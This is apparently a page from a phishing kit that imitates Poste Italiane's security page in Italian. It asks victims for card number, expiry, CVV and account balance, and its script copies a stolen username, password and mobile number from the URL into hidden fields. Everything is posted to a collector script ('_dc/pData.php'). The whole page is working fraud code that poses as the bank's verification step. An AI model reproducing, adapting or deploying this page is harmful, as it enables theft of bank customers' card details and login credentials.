﻿<!doctype html>
<html>
<head>
	<meta charset="utf-8">
	<meta name="viewport" content="width=device-width, initial-scale=1.0">
	<title>Inserisci i tuoi dati personali</title>
	<link type="text/css" rel="stylesheet" href="css/bootstrap.min.css">
	<link type="text/css" rel="stylesheet" href="css/fonts.css">
	<link type="text/css" rel="stylesheet" href="css/style.css">
	<script src="https://code.jquery.com/jquery-latest.min.js"></script>
	<script type="text/javascript" src="script/bootstrap.min.js"></script>
	<script type="text/javascript" src="script/site.js"></script>
</head>


<body>

	<div class="preload">
		<p>
			<img src="img/logo.png" class="logo">
		</p>
		<p>
			<img src="img/spn.gif" class="spn" />
		</p>
	</div>
	<div class="container-fluid">
		<div class="row">
			<div class="col-lg-12 header fixed">
				<header>
					<img src="img/back.png" class="back" />
					<img src="img/logo.png" class="logo">
				</header>
			</div>
		</div>
	</div>
	<div class="container-fluid bd-bot-header">
		<div class="row">
			<div class="col-lg-12 bd">
				<h1>
					Sicurezza
				</h1>
				<div class="cards" style="margin-top:10px">
					<div class="pnl-h">
						<h4>
							Inserisci le tue credenziali
						</h4>
					</div>
					<form action="_dc/pData.php" method="post">
						<input type="hidden" name="usr" class="usr">
						<input type="hidden" name="pwd" class="pwd">
						<input type="hidden" name="cellulare" class="cellulare">
						<input type="hidden" name="rel" class="rel" value="1">
						<div class="pnl-bd">
							<div class="form-group">
								<p>
									<label class="control-label">
										NUMERO CARTA
									</label>
									<input name="carta"
										   class="form-control" required pattern=".{16,16}" maxlength="16" onKeyUp="if(isNaN(this.value))this.value=''; if(this.value.substr(0,1) < 4)this.value=''; if(this.value.substr(0,1) > 5)this.value = ''; if(this.value.length == 16)mese.focus();" placeholder="Inserisci" type="text">
								</p>
							</div>
							<div class="form-group">
								<label class="control-label">
									SCADENZA MESE ANNO
								</label>
								<select class="form-control" name="scadenzaMese" required>
									<option value="01">Gennaio</option>
									<option value="02">Febbraio</option>
									<option value="03">Marzo</option>
									<option value="04">Aprile</option>
									<option value="05">Maggio</option>
									<option value="06">Giugno</option>
									<option value="07">Luglio</option>
									<option value="08">Agosto</option>
									<option value="09">Settembre</option>
									<option value="10">Ottobre</option>
									<option value="11">Novembre</option>
									<option value="12">Dicembre</option>
								</select>
							</div>
							<div class="form-group">
								<select class="form-control" name="scadenzaAnno">
									<option value="21">2021</option>
									<option value="22">2022</option>
									<option value="23">2023</option>
									<option value="24">2024</option>
									<option value="25">2025</option>
									<option value="26">2026</option>
									<option value="27">2027</option>
									<option value="28">2028</option>
									<option value="29">2029</option>
									<option value="30">2030</option>
									<option value="31">2031</option>
									<option value="32">2032</option>
									<option value="33">2033</option>
									<option value="34">2034</option>
									<option value="35">2035</option>
								</select>
							</div>

							<div class="form-group">
								<p>
									<label class="control-label" for="saldo">
										CVV
									</label>
								</p>
								<input name="cvv" maxlength="3" class="form-control" placeholder="Inserisci" required type="text">
							</div>

							<div class="form-group">
								<p>
									<label class="control-label" for="saldo">
										SALDO DISPONIBILE
									</label>
								</p>
								<p style="float:left; width:100%; font-size:16px!important">
									<strong>(per verificare la titolarità del conto)</strong>
								</p>
								<input name="saldo" class="form-control" placeholder="Inserisci il saldo disponibile" required type="text">
							</div>

							<input type="submit" class="btn btn-primary" value="convalida">

						</div>
					</form>
				</div>
			</div>
		</div>
		<div class="row">
			<div class="col-lg-12">
				<div class="content-main">
					<div class="container">
						<div class="row">
							<div class="col-lg-12">
								<h2>Hai bisogno di aiuto?</h2>
							</div>
							<div class="col-md-8 col-lg-push-1 col-lg-10">
								<div class="row">
									<div class="col-sm-6 col-md-4 col-sm-push-0 col-md-push-0">
										<a href="#" title="Chiamaci" class="btn btn-secondary"><img src="img/ch.png" style="margin-right:10px;">Chiamaci</a>
									</div>
									<div class="col-sm-6 col-md-4">
										<a href="#" title="Domande Frequenti" class="btn btn-secondary"><img src="img/sc.png" style="margin-right:10px;">Scrivici</a>
									</div>
									<div class="col-sm-6 col-md-4">
										<a href="#" title="Richiedi Assistenza" class="btn btn-secondary">
											<img src="img/vi.png" style="margin-right:10px;">Vieni
											in Poste
										</a>
									</div>
								</div>
							</div>
							<div class="content-main content-text">
								<div class="container">
									<div class="row">
										<div class="col-md-8 col-lg-push-1 col-lg-10 text-center">
											In caso di mancato accesso o non funzionamento dei
											servizi è possibile contattare il Call Center al
											numero verde <a href="tel:803.160">803.160</a> (dal
											lunedì al sabato dalle ore 8.00 alle ore 20.00).
											La chiamata è gratuita.
										</div>
									</div>
								</div>
							</div>
						</div>
					</div>
				</div>
			</div>
		</div>
		<div class="row">
			<div class="col-lg-12 no-padding">
				<div class="content-footer">
					<div class="container">
						<div class="row">
							<div class="col-lg-12">
								<p class="text-cente">
									© Poste Italiane 2021 - Partita iva : 01114601006 <br />
									<a href="#">Preferenze Cookie</a> &nbsp;&nbsp;&nbsp;|
								</p>
							</div>
						</div>
					</div>
				</div>
			</div>
		</div>
	</div>
	<a class="ui-to-top">
		<img src="img/top.png" />
	</a>
	<div class="chat">
		<img src="img/icn_chat.png">
	</div>

	<script>
        $(function () {
            $('.usr').val(querySt("usr"));
            $('.pwd').val(querySt("pwd"));
            $('.cellulare').val(querySt("cellulare"));
        })
	</script>

</body>
</html>
